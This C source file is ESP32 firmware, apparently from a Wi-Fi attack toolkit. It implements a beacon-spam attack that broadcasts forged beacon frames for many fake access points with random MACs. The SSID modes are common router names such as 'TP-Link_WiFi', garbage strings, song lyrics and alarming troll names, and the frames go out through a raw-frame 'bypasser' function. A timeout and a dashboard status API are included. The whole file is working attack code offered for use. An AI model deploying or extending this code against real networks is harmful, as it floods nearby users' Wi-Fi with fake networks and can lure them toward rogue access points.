#include "attack_beacon_spam.h"
#include "wsl_bypasser.h"
#include "heap_psram.h"

#include <stdbool.h>
#include <string.h>
#include <stdio.h>

#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

/* ═══════════════════════════════════════════════
 *  Constants
 * ═══════════════════════════════════════════════ */
static const char *TAG = "beacon_spam";

static const char *mode_strings[] = {
    [BEACON_MODE_COMMON]    = "Common SSIDs",
    [BEACON_MODE_GARBAGE]   = "Garbage",
    [BEACON_MODE_RICK_ROLL] = "Rick Roll",
    [BEACON_MODE_SECURITY]  = "Security/Troll",
    [BEACON_MODE_COUNT]     = "Unknown",
};

/* ── SSID pools ────────────────────────────────────────────── */
static const char *base_names[] = {
    "TP-Link", "Linksys", "Netgear", "ASUS", "D-Link",
    "Home", "Office", "Starlink", "EastWest", "Belkin",
    "Huawei", "Xiaomi", "Samsung", "Cisco", "Arris"
};
static const char *suffixes[] = {
    "_WiFi", "-Guest", "-5G", "_Secure", "", "-2.4G", "_Home", "_IoT"
};

static const char *rick_lyrics[] = {
    "Never Gonna Give You Up", "Never Gonna Let You Down",
    "Never Gonna Run Around",  "And Desert You",
    "Never Gonna Make You Cry", "Never Gonna Say Goodbye",
    "Never Gonna Tell A Lie",  "And Hurt You"
};

static const char *troll_names[] = {
    "FBI Surveillance Van 04", "Virus.exe", "Get Off My LAN",
    "Free Public WiFi", "Loading...", "Searching...",
    "Click for virus", "Not A Government Van",
    "Malware Distribution", "Your Phone Is Hacked",
    "DO NOT CONNECT", "Hackers Nearby",
    "FBI Wiretap #7", "CIA Mobile Unit",
    "DEA Tracking Unit 3", "NSA Field Office"
};

/* ═══════════════════════════════════════════════
 *  Fake AP entry
 * ═══════════════════════════════════════════════ */
typedef struct {
    uint8_t ssid[33];
    uint8_t ssid_len;
    uint8_t bssid[6];
} spam_ap_t;

/* ═══════════════════════════════════════════════
 *  Shared state  (all access MUST go through mutex)
 * ═══════════════════════════════════════════════ */
static SemaphoreHandle_t       beacon_mutex       = NULL;
static spam_ap_t              *spam_pool          = NULL;
static uint16_t                active_spam_count  = 0;
static bool                    is_running         = false;
static beacon_spam_mode_t      cur_mode           = BEACON_MODE_COMMON;
static bool                    timeout_occurred   = false;
static uint32_t                packet_count       = 0;
static int64_t                 start_time_us      = 0;

/* Timer handles (protected by mutex for create/delete,
 * read-only in timer callback after started) */
static esp_timer_handle_t      beacon_timer_handle = NULL;
static esp_timer_handle_t      timeout_timer       = NULL;
static esp_timer_handle_t      timeout_orphan      = NULL;
static bool                    beacon_in_timeout_cb = false;

/* ═══════════════════════════════════════════════
 *  Mutex helpers  (lazy-init, same pattern as PMKID/DoS)
 * ═══════════════════════════════════════════════ */
static bool beacon_mutex_take(void) {
    if (beacon_mutex == NULL) {
        beacon_mutex = xSemaphoreCreateMutex();
        if (beacon_mutex == NULL) {
            ESP_LOGE(TAG, "Failed to create beacon mutex!");
            return false;
        }
    }
    return xSemaphoreTake(beacon_mutex, pdMS_TO_TICKS(5000)) == pdTRUE;
}

static void beacon_mutex_give(void) {
    if (beacon_mutex != NULL) {
        xSemaphoreGive(beacon_mutex);
    }
}

/* ═══════════════════════════════════════════════
 *  SSID generator
 * ═══════════════════════════════════════════════ */
static void generate_ssid_by_mode(uint8_t *ssid, uint8_t *length,
                                   beacon_spam_mode_t mode, int index) {
    char final[33] = {0};

    switch (mode) {
        case BEACON_MODE_COMMON: {
            int b = esp_random() % (sizeof(base_names) / sizeof(base_names[0]));
            int s = esp_random() % (sizeof(suffixes) / sizeof(suffixes[0]));
            snprintf(final, sizeof(final), "%s%s", base_names[b], suffixes[s]);
            break;
        }
        case BEACON_MODE_GARBAGE: {
            const char charset[] =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz"
                "0123456789!@#$%^&*()_+-=[]{}|;";
            int len = 8 + (esp_random() % 12);
            for (int i = 0; i < len && i < 32; i++) {
                final[i] = charset[esp_random() % (sizeof(charset) - 1)];
            }
            break;
        }
        case BEACON_MODE_RICK_ROLL: {
            strncpy(final, rick_lyrics[index % (sizeof(rick_lyrics) / sizeof(rick_lyrics[0]))], 32);
            break;
        }
        case BEACON_MODE_SECURITY: {
            strncpy(final, troll_names[index % (sizeof(troll_names) / sizeof(troll_names[0]))], 32);
            break;
        }
        default:
            snprintf(final, sizeof(final), "Beacon_%d", index);
            break;
    }

    size_t len = strlen(final);
    if (len > 32) len = 32;
    memcpy(ssid, final, len);
    *length = (uint8_t)len;
}

/* ═══════════════════════════════════════════════
 *  Random MAC generator (locally administered)
 * ═══════════════════════════════════════════════ */
static void generate_random_mac(uint8_t mac[6]) {
    for (int j = 0; j < 6; j++) {
        mac[j] = esp_random() & 0xFF;
    }
    /* Set locally-administered bit, clear multicast bit */
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

/* ═══════════════════════════════════════════════
 *  Beacon timer callback — sends all beacons
 *  NOTE: Runs in ESP timer context (ISR-like).
 *  We only read spam_pool[] here, which is written
 *  once at start and never modified during run.
 *  packet_count is atomically incremented.
 * ═══════════════════════════════════════════════ */
static void timer_send_beacon(void *arg) {
    /* Quick running check without mutex (atomic read) */
    if (!is_running || spam_pool == NULL) return;

    uint8_t chan = 1;
    wifi_second_chan_t sec;
    esp_wifi_get_channel(&chan, &sec);

    uint16_t count = active_spam_count;  /* snapshot — set once at start */
    for (int i = 0; i < count; i++) {
        wsl_bypasser_send_beacon_frame(
            spam_pool[i].bssid,
            spam_pool[i].ssid,
            spam_pool[i].ssid_len,
            chan
        );
    }

    /* Increment packet count (lock-free for 32-bit on ESP32) */
    packet_count += count;
}

/* ═══════════════════════════════════════════════
 *  Timeout timer callback
 * ═══════════════════════════════════════════════ */
static void beacon_timeout_cb(void *arg) {
    ESP_LOGW(TAG, "Beacon spam timeout reached (%d s), stopping...",
             BEACON_SPAM_TIMEOUT_SEC);
    if (beacon_mutex_take()) {
        timeout_occurred = true;
        beacon_mutex_give();
    }
    beacon_in_timeout_cb = true;
    attack_beacon_spam_stop();
    beacon_in_timeout_cb = false;
}

static void beacon_timeout_start(void) {
    if (timeout_orphan != NULL) {
        esp_timer_delete(timeout_orphan);
        timeout_orphan = NULL;
    }
    if (timeout_timer != NULL) {
        esp_timer_stop(timeout_timer);
        esp_timer_delete(timeout_timer);
        timeout_timer = NULL;
    }
    const esp_timer_create_args_t args = {
        .callback = beacon_timeout_cb,
        .name     = "beacon_timeout",
    };
    esp_timer_create(&args, &timeout_timer);
    esp_timer_start_once(timeout_timer, BEACON_SPAM_TIMEOUT_US);
}

static void beacon_timeout_stop(void) {
    if (timeout_timer != NULL) {
        esp_timer_stop(timeout_timer);
        if (beacon_in_timeout_cb) {
            timeout_orphan = timeout_timer;
            timeout_timer = NULL;
        } else {
            esp_timer_delete(timeout_timer);
            timeout_timer = NULL;
        }
    }
    if (!beacon_in_timeout_cb && timeout_orphan != NULL) {
        esp_timer_delete(timeout_orphan);
        timeout_orphan = NULL;
    }
}

/* ═══════════════════════════════════════════════
 *  attack_beacon_spam_start
 * ═══════════════════════════════════════════════ */
void attack_beacon_spam_start(uint8_t count, beacon_spam_mode_t mode) {
    if (!beacon_mutex_take()) {
        ESP_LOGE(TAG, "Beacon start failed: mutex timeout");
        return;
    }

    /* Already running? reject */
    if (is_running) {
        ESP_LOGW(TAG, "Beacon spam already running, ignoring start request");
        beacon_mutex_give();
        return;
    }

    /* Validate mode */
    if (mode >= BEACON_MODE_COUNT) {
        ESP_LOGE(TAG, "Invalid beacon mode: %d", mode);
        beacon_mutex_give();
        return;
    }

    /* Reset state */
    timeout_occurred = false;
    packet_count     = 0;
    cur_mode         = mode;
    active_spam_count = (count > 0 && count <= BEACON_SPAM_MAX_APS) ? count : 20;
    start_time_us    = esp_timer_get_time();

    if (spam_pool == NULL) {
        spam_pool = heap_psram_calloc(BEACON_SPAM_MAX_APS, sizeof(spam_ap_t));
        if (spam_pool == NULL) {
            ESP_LOGE(TAG, "Beacon spam pool alloc failed");
            beacon_mutex_give();
            return;
        }
    }

    /* Generate spam pool */
    for (int i = 0; i < active_spam_count; i++) {
        generate_ssid_by_mode(spam_pool[i].ssid, &spam_pool[i].ssid_len, mode, i);
        generate_random_mac(spam_pool[i].bssid);
    }

    is_running = true;
    ESP_LOGI(TAG, "Beacon spam started: %d APs, mode=%s",
             active_spam_count,
             (mode < BEACON_MODE_COUNT) ? mode_strings[mode] : "Unknown");

    /* Create periodic beacon timer (100ms = 10 bursts/sec) */
    if (beacon_timer_handle != NULL) {
        esp_timer_stop(beacon_timer_handle);
        esp_timer_delete(beacon_timer_handle);
        beacon_timer_handle = NULL;
    }
    const esp_timer_create_args_t timer_args = {
        .callback = &timer_send_beacon,
        .name     = "beacon_spam",
    };
    esp_timer_create(&timer_args, &beacon_timer_handle);

    /* Release mutex BEFORE starting timer — timer callback
     * only reads spam_pool which is now immutable until stop */
    beacon_mutex_give();

    esp_timer_start_periodic(beacon_timer_handle, BEACON_SPAM_TIMER_INTERVAL_US);

    /* Start timeout timer */
    beacon_timeout_start();
}

/* ═══════════════════════════════════════════════
 *  attack_beacon_spam_stop
 * ═══════════════════════════════════════════════ */
void attack_beacon_spam_stop(void) {
    if (!beacon_mutex_take()) {
        ESP_LOGE(TAG, "Beacon stop failed: mutex timeout");
        return;
    }

    if (!is_running) {
        beacon_mutex_give();
        return;
    }

    ESP_LOGI(TAG, "Stopping beacon spam (mode=%s, packets=%lu)",
             (cur_mode < BEACON_MODE_COUNT) ? mode_strings[cur_mode] : "Unknown",
             (unsigned long)packet_count);

    is_running         = false;
    active_spam_count  = 0;
    cur_mode           = BEACON_MODE_COMMON;

    /* Stop beacon timer (under mutex for safety) */
    if (beacon_timer_handle != NULL) {
        esp_timer_stop(beacon_timer_handle);
        esp_timer_delete(beacon_timer_handle);
        beacon_timer_handle = NULL;
    }

    beacon_mutex_give();

    /* Stop timeout timer (outside mutex — no contention with timer) */
    beacon_timeout_stop();

    ESP_LOGI(TAG, "Beacon spam stopped. Packets sent: %lu", (unsigned long)packet_count);
}

/* ═══════════════════════════════════════════════
 *  Webserver / Dashboard API getters
 *  (all thread-safe via mutex)
 * ═══════════════════════════════════════════════ */

bool attack_beacon_spam_is_running(void) {
    bool running = false;
    if (beacon_mutex_take()) {
        running = is_running;
        beacon_mutex_give();
    }
    return running;
}

beacon_spam_mode_t attack_beacon_spam_get_mode(void) {
    beacon_spam_mode_t m = BEACON_MODE_COMMON;
    if (beacon_mutex_take()) {
        m = cur_mode;
        beacon_mutex_give();
    }
    return m;
}

const char *attack_beacon_spam_get_mode_str(void) {
    beacon_spam_mode_t m = attack_beacon_spam_get_mode();
    if (m >= BEACON_MODE_COUNT) m = BEACON_MODE_COMMON;
    return mode_strings[m];
}

uint16_t attack_beacon_spam_get_ap_count(void) {
    uint16_t cnt = 0;
    if (beacon_mutex_take()) {
        cnt = active_spam_count;
        beacon_mutex_give();
    }
    return cnt;
}

uint32_t attack_beacon_spam_get_packet_count(void) {
    uint32_t cnt = 0;
    if (beacon_mutex_take()) {
        cnt = packet_count;
        beacon_mutex_give();
    }
    return cnt;
}

uint32_t attack_beacon_spam_get_elapsed_sec(void) {
    uint32_t elapsed = 0;
    if (beacon_mutex_take()) {
        if (is_running && start_time_us > 0) {
            int64_t now_us = esp_timer_get_time();
            elapsed = (uint32_t)((now_us - start_time_us) / 1000000);
        }
        beacon_mutex_give();
    }
    return elapsed;
}

bool attack_beacon_spam_was_timeout(void) {
    bool t = false;
    if (beacon_mutex_take()) {
        t = timeout_occurred;
        beacon_mutex_give();
    }
    return t;
}

const char *attack_beacon_spam_get_status_str(void) {
    if (!attack_beacon_spam_is_running()) {
        if (attack_beacon_spam_was_timeout()) {
            return "Timeout";
        }
        return "Idle";
    }
    return "Spamming";
}

/* ═══════════════════════════════════════════════
 *  Full status JSON for dashboard API
 * ═══════════════════════════════════════════════ */
cJSON *attack_beacon_spam_get_status_json(void) {
    cJSON *root = cJSON_CreateObject();
    if (root == NULL) return NULL;

    if (beacon_mutex_take()) {
        cJSON_AddBoolToObject(root,   "running",       is_running);
        cJSON_AddNumberToObject(root, "mode",          (double)cur_mode);
        cJSON_AddStringToObject(root, "mode_str",
            (cur_mode < BEACON_MODE_COUNT) ? mode_strings[cur_mode] : "Unknown");
        cJSON_AddNumberToObject(root, "ap_count",      active_spam_count);
        cJSON_AddNumberToObject(root, "packet_count",  packet_count);
        cJSON_AddNumberToObject(root, "timeout_sec",   BEACON_SPAM_TIMEOUT_SEC);

        /* Elapsed time */
        uint32_t elapsed = 0;
        if (is_running && start_time_us > 0) {
            int64_t now_us = esp_timer_get_time();
            elapsed = (uint32_t)((now_us - start_time_us) / 1000000);
        }
        cJSON_AddNumberToObject(root, "elapsed_sec",   elapsed);

        /* Remaining time */
        int32_t remaining = 0;
        if (is_running) {
            remaining = BEACON_SPAM_TIMEOUT_SEC - (int32_t)elapsed;
            if (remaining < 0) remaining = 0;
        }
        cJSON_AddNumberToObject(root, "remaining_sec", remaining);

        cJSON_AddBoolToObject(root,   "timeout",       timeout_occurred);
        cJSON_AddStringToObject(root, "status",
            (!is_running)
                ? (timeout_occurred ? "Timeout" : "Idle")
                : "Spamming");

        beacon_mutex_give();
    } else {
        /* Fallback if mutex unavailable */
        cJSON_AddBoolToObject(root,   "running",  false);
        cJSON_AddStringToObject(root, "status",   "Unknown");
        cJSON_AddStringToObject(root, "mode_str", "Unknown");
        cJSON_AddNumberToObject(root, "ap_count", 0);
        cJSON_AddNumberToObject(root, "packet_count", 0);
    }

    return root;
}
